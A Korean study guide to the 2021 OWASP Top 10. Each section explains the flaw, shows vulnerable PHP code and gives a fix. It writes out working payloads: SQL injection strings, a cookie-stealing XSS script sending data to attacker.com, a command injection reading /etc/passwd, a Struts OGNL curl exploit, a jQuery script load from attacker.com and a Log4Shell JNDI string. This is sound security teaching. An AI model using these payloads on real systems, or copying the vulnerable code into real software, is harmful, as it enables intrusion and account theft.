# **2021 OWASP Top 10**

### 1. Broken Access Control, 취약한 접근 통제

**공격 방식**:

- 인증되지 않은 사용자가 권한이 필요한 리소스에 접근할 수 있다.
- 일반 사용자가 관리자 권한이 필요한 페이지를 열람하거나 기능을 실행할 수 있다.
- URL 매개변수(id, role 등)를 조작하여 다른 사용자의 정보를 조회하거나 수정할 수 있다.
- 클라이언트 측에서 권한 검사를 수행하여 이를 우회하는 공격이 가능하다.

<br>

**공격 시나리오**:

1. URL 조작을 통한 다른 사용자 정보 탈취의 경우

   웹 사이트에서 자신의 계정 정보만 볼 수 있어야 하는데, URL 매개변수를 변경하여 다른 사용자의 정보를 열람하는 공격이다.

   - 사용자가 자신의 프로필 페이지에 접근한다.

   ```bash
   GET /user/profile?id=1001
   ```

   - 공격자가 URL의 `id` 값을 변경하여 다른 사용자의 정보를 열람한다.

   ```bash
   GET /user/profile?id=1002
   ```

   - 서버에서 `id=1002`의 정보를 반환하는 경우, 공격자는 다른 사용자의 정보를 쉽게 조회할 수 있게 된다.

   <br>

   **취약한 코드 예시**

   ```php
   <?php
   // 사용자 정보 조회 API
   $id = $_GET['id']; // URL에서 ID를 직접 가져옴
   $sql = "SELECT * FROM users WHERE id = $id";
   $result = mysqli_query($conn, $sql);
   $user = mysqli_fetch_assoc($result);

   echo json_encode($user);
   ?>
   ```

   **문제점**

   - 서버가 로그인한 사용자의 `id`와 요청한 `id`가 일치하는지 확인하지 않는다.
   - 공격자는 단순히 `id` 값을 변경하는 것만으로 다른 사용자의 정보를 탈취 가능하다.

   <br>

   **방어 방법**:

   ```php
   <?php
   session_start();
   $user_id = $_SESSION['user_id']; // 로그인한 사용자의 ID

   $sql = "SELECT * FROM users WHERE id = ?";
   $stmt = $conn->prepare($sql);
   $stmt->bind_param("i", $user_id); // 세션에서 가져온 사용자 ID만 조회 가능
   $stmt->execute();
   $result = $stmt->get_result();
   $user = $result->fetch_assoc();

   echo json_encode($user);
   ?>
   ```

   - 로그인한 사용자의 `id`와 요청한 `id`가 일치하는지 확인한다.
   - SQL 바인딩을 사용하여 SQL Injection을 방지한다.

<br>
<br>

2. Privilege Escalation, 권한 상승 공격

   일반 사용자가 관리자 페이지에 접근하거나 관리자 권한을 획득하는 공격이다.

   일반 사용자가 `user` 역할을 가지고 있지만, 요청을 수정하여 `admin` 역할을 얻을 수 있는 경우가 존재한다.

   <br>

   **취약한 코드 예시**

   ```php
   <?php
   if ($_SESSION['role'] == 'admin') {
    echo "관리자 페이지에 접근할 수 있습니다.";
   } else {
    echo "접근 불가";
   }
   ?>
   ```

   **문제점**

   - 클라라이언트 측에서 세션 변수를 직접 변경할 가능성이 있다.
   - `role` 값이 클라이언트에서 조작될 경우 관리자 권한을 획득 가능하다.

   ```javascript
   document.cookie = "role=admin"; // 세션 조작
   ```

   이후 관리자 페이지에 다시 접속하면, 공격자가 관리자의 권한을 획득할 수 있다.

    <br>

   **방어 방법**:

   ```php
   <?php
   // 보안 강화된 접근 통제
   session_start();
   if (!isset($_SESSION['role']) || $_SESSION['role'] !== 'admin') {
       die("접근이 거부되었습니다.");
   }
   echo "관리자 페이지입니다.";
   ?>
   ```

   - 세션 값은 서버에서만 관리하며, 클라이언트에서 임의로 수정할 수 없도록 작성한다.
   - 중요한 데이터는 클라이언트에서 직접 조작할 수 없도록 HTTPOnly 속성을 추가한다.

<br>

**방어 방법 요약**

- 클라이언트 검증만 믿지 않기, 서버 측에서 권한 확인
- 세션 기반 검증 사용 (`$_SESSION` 활용)
- RBAC 및 PBAC 적용
- URL 및 입력값 검증 철저 (예: `id` 변경 시 본인 정보만 조회 가능하도록 제한)
- 관리자 페이지 별도 보호 (예: `/admin` 경로 접근 제한)

<br>
<br>

---

### 2. Cryptographic Failures, 암호화 실패

**공격 방식**:

1. 민감한 데이터가 암호화되지 않음

   - 비밀번호, 신용카드 정보, 개인 식별 정보(PII, Personally Identifiable Information) 등이 암호화되지 않은 상태로 저장되거나 전송된다.
   - 데이터베이스에 평문(Plaintext) 비밀번호 저장의 경우,

   ```sql
   INSERT INTO users (username, password) VALUES ('admin', '123456');
   ```

   - 공격자가 데이터베이스에 접근하면 모든 계정의 비밀번호를 쉽게 확인할 수 있다.

2. 취약한 암호화 알고리즘 사용

   - 보안이 약한 알고리즘(MD5, SHA-1, DES 등)을 사용하면 공격자가 쉽게 복호화 가능하다.
   - MD5로 해시된 비밀번호는 레인보우 테이블 공격(Rainbow Table Attack)에 취약하다.

   ```php
   $hashed_password = md5('mypassword'); // 취약한 해시 알고리즘
   ```

   - MD5는 빠른 해싱 알고리즘이므로 사전 공격(Dictionary Attack)과 레인보우 테이블 공격에 의해 쉽게 뚫릴 수 있다.

3. HTTPS 미사용 (데이터 평문 전송)

   - 로그인 요청, 결제 정보 등이 HTTP(비보안 프로토콜)로 전송되면 중간자 공격(Man-in-the-Middle, MITM)에 노출될 수 있다.
   - 로그인 요청이 HTTP로 전송된다.

   ```sql
   POST http://example.com/login
   Content-Type: application/x-www-form-urlencoded

   username=admin&password=123456
   ```

   - 공격자가 네트워크에서 이 요청을 가로채면 계정 정보가 노출된다.

4. 하드코딩된 키 또는 재사용된 암호화 키 사용
   - 암호화 키를 코드에 직접 포함하면 소스 코드 유출 시 전체 보안이 깨진다.
   - 소스 코드 내 하드코딩된 API 키 및 암호화 키의 경우,
   ```php
   $encryption_key = "my_secret_key"; // 보안 문제 발생 가능
   ```
   - 키가 유출되면 모든 암호화된 데이터가 복호화될 위험이 존재한다.

<br>

**공격 시나리오**:

1. 네트워크 스니핑을 통한 로그인 정보 탈취

   사용자가 HTTP를 통해 로그인 요청을 보낸다.

   ```pgsql
   POST http://example.com/login
   Content-Type: application/x-www-form-urlencoded

   username=admin&password=123456
   ```

   공격자는 같은 네트워크에 연결된 상태에서 Packet Sniffing을 통해 평문 데이터를 가로챈다.

   가로챈 데이터를 분석하여 사용자의 로그인 정보를 확인하고 계정 탈취가 가능하다.

   <br>

   **방어 방법**:

   - HTTPS (TLS 1.2 이상)를 사용하여 데이터를 암호화한다.
   - 모든 요청을 HTTP → HTTPS로 강제 리디렉션한다.
   - Strict-Transport-Security(HSTS) 헤더를 적용하여 HTTPS 연결을 강제한다.

   ```apache
   Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
   ```

   <br>

2. 취약한 암호화 알고리즘 사용으로 비밀번호 복호화

   웹 사이트가 사용자의 비밀번호를 MD5 또는 SHA-1 해시 알고리즘으로 저장한다.

   공격자가 데이터베이스에서 `5f4dcc3b5aa765d61d8327deb882cf99` 값을 발견한다.

   해시 값을 레인보우 테이블을 이용해 복호화하여 `password123`임을 확인한다.

   공격자는 탈취한 비밀번호를 이용해 사용자 계정에 접근 가능해진다.

   <br>

   **방어 방법**:

   - bcrypt, Argon2 같은 강력한 해시 알고리즘을 사용히고, 가능하면 최신 표준인 Argon2를 우선적으로 적용한다.
   - Salt(임의의 난수 값) 추가로 동일한 비밀번호라도 해시값이 다르게 저장되도록 한다.

   ```PHP
   // bcrypt 적용
   $password = "mypassword";
   $hashed_password = password_hash($password, PASSWORD_BCRYPT);
   ```

<br>
<br>

---

### 3. Injection, 인젝션 공격

: 사용자 입력값이 제대로 검증되지 않은 채 코드로 실행되는 보안 취약점을 악용하는 공격 기법

**공격 방식**:

- SQL Injection → 데이터베이스 조작
- XSS(Cross-Site Scripting) → 웹 페이지에서 악성 스크립트 실행
- Command Injection → 시스템 명령어 실행

<br>

**공격 시나리오**:

1. SQL Injection

   - SQL 쿼리에 사용자의 입력값이 직접 포함될 때 발생한다.
   - 공격자는 입력값을 조작하여 데이터를 조회, 수정, 삭제하거나 관리자의 권한을 탈취할 수 있다.

   - 인증 우회(로그인 우회)의 경우,

     ```php
     <?php
     $id = $_POST['id'];
     $pw = $_POST['pw'];

     $query = "SELECT * FROM users WHERE id = '$id' AND pw = '$pw'";
     $result = mysqli_query($conn, $query);
     ?>
     ```

     - 위 코드는 사용자의 입력을 검증 없이 SQL 문에 직접 포함하여 취약점이 발생한다.

     ```sql
     ' OR '1'='1' --
     ```

     - 공격자는 다음과 같은 값을 입력한다.

     ```sql
     SELECT * FROM users WHERE id = '' OR '1'='1' -- ' AND pw = ''
     ```

     - `'1'='1'` 조건이 항상 참이 되므로 비밀번호 검증 없이 로그인이 가능해진다.

      <br>

     **방어 방법**:

     ```php
     <?php
     $stmt = $conn->prepare("SELECT * FROM users WHERE id = ? AND pw = ?");
     $stmt->bind_param("ss", $_POST['id'], $_POST['pw']);
     $stmt->execute();
     $result = $stmt->get_result();
     ?>
     ```

     - Prepared Statement를 사용하여 SQL Injection 공격을 방어할 수 있다.
     - `?` 플레이스홀더를 사용하여 사용자 입력을 안전하게 처리한다.

   <br>

   - 데이터 탈취의 경우,

     ```sql
     1 UNION SELECT username, password FROM users --
     ```

     ```sql
     SELECT * FROM products WHERE id = 1 UNION SELECT username, password FROM users --
     ```

     - 그 결과 DB의 `users` 테이블에서 모든 계정 정보가 노출된다.

      <br>

     **방어 방법**:

     ```php
     <?php
     // PHP에서 ORM (예: Laravel의 Eloquent) 사용
     $user = User::where('id', $id)->first();
     ?>
     ```

     - ORM을 사용하면 직접 SQL 쿼리를 작성하지 않고도 안전하게 데이터베이스를 조회할 수 있다.

<br>

2. XSS (Cross-Site Scripting)

   - 사용자가 입력한 값이 필터링되지 않고 그대로 웹 페이지에 출력될 때 발생한다.
   - 공격자는 악성 스크립트를 삽입하여 사용자의 세션 탈취, 피싱 공격 등을 수행할 수 있다.

   - 쿠키 탈취의 경우,

     ```php
     <?php
     echo "<p>".$_GET['message']."</p>";
     ?>
     ```

     - 취약한 코드는 위와 같다.

     ```html
     <script>
       document.location =
         "http://attacker.com/steal.php?cookie=" + document.cookie;
     </script>
     ```

     - 사용자의 로그인 쿠키가 `attacker.com` 으로 전송되며, 계정 탈취가 가능해진다.

      <br>

     **방어 방법**:

     ```php
     <?php
     echo "<p>" . htmlspecialchars($_GET['message'], ENT_QUOTES, 'UTF-8') . "</p>";
     ?>
     ```

     - `htmlspecialchars()`를 사용하면 HTML 태그가 일반 문자열로 변환되어 스크립트 실행이 차단된다.

      <br>

     ```html
     <meta
       http-equiv="Content-Security-Policy"
       content="default-src 'self'; script-src 'self'" />
     ```

     - 외부 스크립트 실행을 제한하여 XSS 공격을 방어할 수 있다.

<br>

3. Command Injection

   - 웹 애플리케이션이 시스템 명령어를 실행할 때 사용자의 입력을 직접 포함할 경우 발생한다.
   - 공격자는 임의의 명령어를 실행하여 서버를 제어할 수 있다.

   - 시스템 명령어 실행의 경우,

     ```php
     <?php
     $ip = $_GET['ip'];
     echo shell_exec("ping -c 4 " . $ip);
     ?>
     ```

     ```php
     127.0.0.1; cat /etc/passwd
     ```

     ```bash
     ping -c 4 127.0.0.1; cat /etc/passwd
     ```

     - `/etc/passwd` 파일이 출력되면서 서버 사용자 계정 정보가 노출될 수 있다.

      <br>

     **방어 방법**:

     ```php
     <?php
     $ip = escapeshellarg($_GET['ip']);
     echo shell_exec("ping -c 4 " . $ip);
     ?>
     ```

     - `escapeshellarg()`를 사용하면 사용자 입력값을 하나의 안전한 인자로 처리하여 명령어 삽입을 방지할 수 있다.

     ```php
     <?php
     if (preg_match('/^[0-9\.]+$/', $_GET['ip'])) {
        $ip = $_GET['ip'];
        echo shell_exec("ping -c 4 " . $ip);
     } else {
        echo "잘못된 입력입니다.";
     }
     ?>
     ```

     - 정규식을 사용하여 숫자와 점만 허용한다.
     - IP 주소 형식이 아닌 입력을 차단한다.

<br>
<br>

---

### 4. Insecure Design, 취약한 설계

보안이 충분히 고려되지 않은 시스템 설계로 인해 발생한다.

단순한 구현상의 실수가 아닌, 보안 요소가 설계 단계에서부터 반영되지 않은 경우를 포함한다.

일반적으로 비즈니스 로직의 허점을 악용하는 방식으로 이루어진다.

<br>

**공격 방식**:

- 비즈니스 로직 취약점: 설계 단계에서 보안 검토 없이 기능을 추가하여 사용자가 의도치 않게 시스템을 조작할 수 있도록 한다.
- 권한 관리 오류: 특정 사용자만 사용해야 하는 기능을 검증하지 않아, 일반 사용자가 관리자 권한을 수행할 수 있도록 허용된다.
- 데이터 검증 부족: 클라이언트에서 전달된 데이터를 제대로 검증하지 않아 악용될 가능성이 있다.

<br>

**공격 시나리오**:

1. 쿠폰 중복 사용 공격

   ```php
   // 사용자가 쿠폰을 적용하는 API
   $userId = $_SESSION['user_id'];
   $couponCode = $_POST['coupon_code'];

   // 쿠폰이 존재하는지 확인
   $query = "SELECT * FROM coupons WHERE code = '$couponCode' AND is_used = 0";
   $result = mysqli_query($conn, $query);
   if (mysqli_num_rows($result) > 0) {
      // 쿠폰 사용 처리
      $updateQuery = "UPDATE coupons SET is_used = 1 WHERE code = '$couponCode'";
      mysqli_query($conn, $updateQuery);
      echo "쿠폰이 적용되었습니다.";
   } else {
      echo "잘못된 쿠폰이거나 이미 사용되었습니다.";
   }
   ```

   - 쿠폰 사용을 처리하는 과정에서 트랜잭션이 없으며, 동시 요청이 발생하면 중복 적용이 가능하다.
   - 쿠폰을 사용자와 연결하는 정보가 부족하여, 다른 사용자의 쿠폰을 사용할 수도 있다.

   <br>

   **방어 방법**:

   - 쿠폰을 특정 사용자에게 매칭하여 등록하도록 설계한다.
   - 데이터베이스 트랜잭션을 적용하여 동시 요청을 방지한다.
   - 쿠폰 사용 로직에서 추가적인 검증을 수행한다.

   ```php
   // 트랜잭션 시작
   mysqli_begin_transaction($conn);

   $userId = $_SESSION['user_id'];
   $couponCode = $_POST['coupon_code'];

   // 쿠폰이 해당 사용자에게 속하는지 확인하고 사용되지 않았는지 검사
   $query = "SELECT * FROM coupons WHERE code = ? AND user_id = ? AND is_used = 0 FOR UPDATE";
   $stmt = mysqli_prepare($conn, $query);
   mysqli_stmt_bind_param($stmt, "si", $couponCode, $userId);
   mysqli_stmt_execute($stmt);
   $result = mysqli_stmt_get_result($stmt);

   if (mysqli_num_rows($result) > 0) {
      // 쿠폰 사용 처리
      $updateQuery = "UPDATE coupons SET is_used = 1 WHERE code = ?";
      $stmt = mysqli_prepare($conn, $updateQuery);
      mysqli_stmt_bind_param($stmt, "s", $couponCode);
      mysqli_stmt_execute($stmt);

      // 트랜잭션 커밋
      mysqli_commit($conn);
      echo "쿠폰이 적용되었습니다.";
   } else {
      // 트랜잭션 롤백
      mysqli_rollback($conn);
      echo "잘못된 쿠폰이거나 이미 사용되었습니다.";
   }
   ```

<br>

2. 관리자 권한 상승 공격

   ```php
   // 사용자의 프로필 정보를 가져오는 API
   $userId = $_GET['user_id'];
   $query = "SELECT * FROM users WHERE id = $userId";
   $result = mysqli_query($conn, $query);
   $userData = mysqli_fetch_assoc($result);
   ```

   - `user_id`를 직접 입력받아 조회하는 방식으로, 공격자가 URL을 조작하여 다른 사용자의 정보도 조회 가능해진다.
   - 권한 검증 없이 요청을 처리한다.

      <br>

   **방어 방법**:

   - 현재 로그인한 사용자의 정보만 조회하도록 제한한다.
   - 인증된 사용자 ID를 세션에서 가져오도록 수정한다.

   ```php
   // 현재 로그인한 사용자 정보만 가져오도록 제한
   $userId = $_SESSION['user_id'];
   $query = "SELECT * FROM users WHERE id = ?";
   $stmt = mysqli_prepare($conn, $query);
   mysqli_stmt_bind_param($stmt, "i", $userId);
   mysqli_stmt_execute($stmt);
   $result = mysqli_stmt_get_result($stmt);
   $userData = mysqli_fetch_assoc($result);
   ```

   <br>

3. 데이터 검증 부족으로 인한 계정 탈취

   ```php
   // 비밀번호 변경 API
   $userId = $_POST['user_id'];
   $newPassword = $_POST['new_password'];
   $query = "UPDATE users SET password = '$newPassword' WHERE id = $userId";
   mysqli_query($conn, $query);
   ```

   - `user_id`를 클라이언트에서 전달받아 조작이 가능하다.
   - 비밀번호를 해싱하지 않고 저장한다.

   <br>

   **방어 방법**:

   - 현재 로그인한 사용자의 ID를 세션에서 가져오도록 수정한다.
   - 비밀번호를 해싱하여 저장한다.

   ```php
   // 비밀번호 변경 API
   $userId = $_SESSION['user_id'];
   $newPassword = password_hash($_POST['new_password'], PASSWORD_BCRYPT);
   $query = "UPDATE users SET password = ? WHERE id = ?";
   $stmt = mysqli_prepare($conn, $query);
   mysqli_stmt_bind_param($stmt, "si", $newPassword, $userId);
   mysqli_stmt_execute($stmt);
   ```

<br>
<br>

### 5. Security Misconfiguration, 보안 설정 오류

**공격 방식**:

- 기본 관리자 계정 및 비밀번호 미변경
- 디버그 모드가 활성화된 상태로 운영
- 불필요한 포트 및 서비스 노출

<br>

**공격 시나리오**:

1. 기본 관리자 계정 및 비밀번호 미변경

   공격자는 웹 에플리케이션의 관리 페이지(`/admin`)에 접근하여
   기본 제공 계정 (`admin:admin`)을 사용해 로그인한다.

   <br>

   **방어 방법**:

   - 기본 계정을 삭제하고, 새로운 관리자 계정을 생성한다.
   - 강력한 비밀번호 정책을 적용하여 짧거나 쉬운 비밀번호 사용을 방지한다.
   - 계정 잠금 기능을 추가하여 여러 번 로그인 실패 시 계정을 비활성화한다.

   ```php
   // 비밀번호 해싱 및 강력한 비밀번호 적용
   $password = "Admin123!";
   $hashedPassword = password_hash($password, PASSWORD_BCRYPT);

   // 비밀번호 검증
   if (password_verify($_POST['password'], $hashedPassword)) {
      echo "로그인 성공";
   } else {
      echo "로그인 실패";
   }
   ```

<br>

2. 디버그 모드가 활성화된 상태로 운영

   공격자는 애플리케이션이 디버그 모드가 활성화된 상태에서 실행되는 것을 발견하고,
   오류 메세지를 통해 데이터베이스 연결 정보 또는 시스템 구조를 파악한다.

   <br>

   **방어 방법**:

   - 운영 환경에서는 디버그 모드를 비활성화한다.
   - 환경 변수 파일 (`.env`)을 사용하여 디버그 모드를 제어한다.

   ```php
   // .env 파일 설정
   DEBUG=false

   // PHP에서 디버그 모드 비활성화
   $debug = getenv('DEBUG');
   if ($debug === 'true') {
      ini_set('display_errors', 1);
      error_reporting(E_ALL);
   } else {
      ini_set('display_errors', 0);
      error_reporting(0);
   }
   ```

<br>

3. 불필요한 포트 및 서비스 노출

   공격자는 서버에서 실행 중인 불필요한 서비스 및 포트를 스캔하고,
   해당 포트를 통해 서버에 접근할 수 있는 취약점을 탐색한다.

   <br>

   **방어 방법**:

   - 사용하지 않는 포트 및 서비스를 비활성화한다.
   - 방화벽을 설정하여 외부 접근을 차단한다.
   - `iptables` 또는 `UFW`를 사용하여 접근 제어를 강화한다.

   ```sh
   # UFW 방화벽을 사용하여 22번 포트(SSH)만 허용
   sudo ufw default deny incoming
   sudo ufw allow 22/tcp
   sudo ufw enable
   ```

   ```apache
   # Apache 설정 파일에서 특정 IP만 관리자 페이지 접근 가능하도록 설정
   <Directory /var/www/html/admin>
      Require ip 192.168.1.100
   </Directory>
   ```

<br>
<br>

---

### 6. Vulnerable and Outdated Components, 취약하고 오래된 구성 요소 사용

**공격 방식**:

- 오래된 라이브러리 및 프레임 워크 사용
- 알려진 보안 취약점이 있는 버전 사용
- 보안 패치가 적용되지 않은 소프트웨어 실행
- 의존성 업데이트 미비로 인해 공격자가 취약점을 악용할 가능성 증가

<br>

**공격 시나리오**:

1. Apache Struts 원격 코드 실행 (RCE)

   - Apache Struts 2의 특정 버전에는 원격 코드 실행 취약점이 존재한다.
   - 공격자는 악의적인 입력을 통해 서버에서 임의의 명령을 실행할 수 있다.

   ```bash
   # 공격자가 악성 페이로드를 전송하여 서버에서 임의의 명령을 실행
   curl -X POST -H "Content-Type: application/json" \
      --data '{"name":"%{(#_memberAccess["allowStaticMethodAccess"]=true).(#cmds=("/bin/bash","-c","cat /etc/passwd")).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.start())}"}' \
      http://target.com/vulnerable-endpoint
   ```

   <br>

   **방어 방법**:

   - 최신 보안 패치를 적용한다. (Apache Struts의 최신 버전으로 업그레이드)
   - 입력값 검증 및 필터링을 적용한다.
   - WAF(Web Application Firewall) 설정으로 악성 요청을 차단한다.

<br>

2. jQuery 취약점 (XSS, Prototype Pollution)

   오래된 jQuery 버전은 XSS 및 프로토타입 오염 공격에 취약할 수 있다.

   ```html
   <script src="https://code.jquery.com/jquery-1.8.3.min.js"></script>
   <script>
     $.getScript("http://attacker.com/malicious.js");
   </script>
   ```

   <br>

   **방어 방법**

   - 최신 버전의 jQuery를 사용한다.
   - 콘텐츠 보안 정책(Content Security Policy, CSP)을 적용한다.
   - 외부 스크립트 로딩을 제한한다.

<br>

3. Log4j 취약점 (Log4Shell, CVE-2021-44228)

   Log4j 2.x 버전 중 일부는 원격 코드 실행 취약점을 포함하고 있어,
   공격자가 조작된 입력을 로그에 기록하게 하면 원격에서 코드를 실행할 수 있다.

   ```java
   logger.info("User agent: " + userInput);
   ```

   공격자가 `userInput` 값에 다음과 같은 악성 페이로드를 입력하면 서버에서 원격 코드 실행이 발생할 수 있다.

   ```bash
   ${jndi:ldap://malicious-server.com/exploit}
   ```

   <br>

   **방어 방법**

   - 최신 Log4j 버전으로 업그레이드한다.
   - `log4j2.formatMsgNoLookups=true` 설정으로 JNDI 조회를 비활성화한다.
   - `log4j-core`가 불필요하면 제거한다.

<br>

**방어 방법 요약**

1. 보안 패치 및 업데이트

   - 최신 프레임워크, 라이브러리, 소프트웨어를 사용한다.
   - 자동 업데이트 또는 정기적인 보안 점검을 시행한다.

2. 의존성 검사 및 취약점 분석

   - `npm audit`, `yarn audit`, `composer audit`, `pip-audit` 등의 도구를 사용한다.
   - OWASP Dependency-Check, Snyk, GitHub Dependabot을 활용한다.

3. 입력값 검증 및 필터링

   - 사용자 입력값을 신뢰하지 않고 철저한 검증을 수행한다.
   - WAF(Web Application Firewall)을 적용한다.

4. 불필요한 기능 제거
   - 사용하지 않는 플러그인, 라이브러리, 패키지를 제거한다.
   - 기본적으로 보안 설정을 강화하고, 필요할 때만 기능을 활성화한다.

<br>
<br>

---

### 7. Identification and Authentication Failures, 인증 및 식별 실패

**공격 방식**:

- 취약한 비밀번호 정책
- Multi-Factor Authentication (MFA) 미사용
- Brute Force 공격 가능

**공격 시나리오**:
사용자가 "password123" 같은 쉬운 비밀번호를 사용하여 계정이 탈취된다.

**방어 방법**:

- 강력한 비밀번호 정책 적용
- MFA 적용
- 로그인 시도 횟수 제한

<br>
<br>

### 8. Software and Data Integrity Failures, 소프트웨어 및 데이터 무결성 실패

**공격 방식**:

- 코드 또는 데이터가 무단으로 변경됨
- 악성 업데이트 파일 다운로드

**공격 시나리오**:
공격자가 CDN을 해킹하여 악성 JavaScript가 포함된 라이브러리를 제공한다.

**방어 방법**:

- 코드 서명 및 무결성 검증
- 안전한 업데이트 메커니즘 사용

<br>
<br>

### 9. Security Logging and Monitoring Failures, 보안 로깅 및 모니터링 실패

**공격 방식**:

- 보안 이벤트가 기록되지 않아 공격 탐지 불가능
- 실시간 모니터링 미비로 인한 대응 지연

**공격 시나리오**:
공격자가 1000번 이상 로그인 시도를 했지만, 로그가 남지 않아 탐지되지 않는다.

**방어 방법**:

- 로그 수집 및 분석 시스템 구축
- 침입 탐지 시스템(IDS) 및 보안 정보 이벤트 관리(SIEM) 도입

<br>
<br>

### 10. Server-Side Request Forgery, SSRF

**공격 방식**:

- 서버가 공격자의 요청을 대신 수행
- 내부 네트워크로의 접근 허용

**공격 시나리오**:
공격자가 `/fetch?url=http://internal/admin`을 요청하여 내부 관리자 페이지에 접근한다.

**방어 방법**:

- 외부 요청을 제한
- 화이트리스트 기반 접근 제어를 적용
